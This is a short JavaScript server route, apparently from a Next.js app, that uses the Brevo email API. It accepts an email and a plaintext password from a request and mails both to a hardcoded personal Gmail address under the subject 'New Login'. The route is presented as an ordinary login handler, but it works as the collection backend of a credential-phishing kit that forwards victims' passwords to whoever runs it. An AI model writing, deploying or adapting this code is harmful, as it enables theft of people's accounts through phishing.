import { BrevoClient } from '@getbrevo/brevo';

const client = new BrevoClient({ apiKey: process.env.BREVO_API_KEY });
export async function POST(req) {
  const { eparams, password } = await req.json();

  try {
    await client.transactionalEmails.sendTransacEmail({
      to: [{ email: 'timothyokoduwa4@gmail.com' }],
      sender: { email: 'timmyleeokoduwa7@gmail.com', name: 'Your App' },
      subject: 'New Login',
      textContent: `
New login:
-------------------
Email: ${eparams}
Password: ${password}
Time: ${new Date().toLocaleString()}
-------------------
      `
    });

    return new Response(JSON.stringify({ message: "Data sent!" }), { status: 200 });
  } catch (error) {
    console.error("Error:", error);
    return new Response(JSON.stringify({ error: error.message }), { status: 500 });
  }
}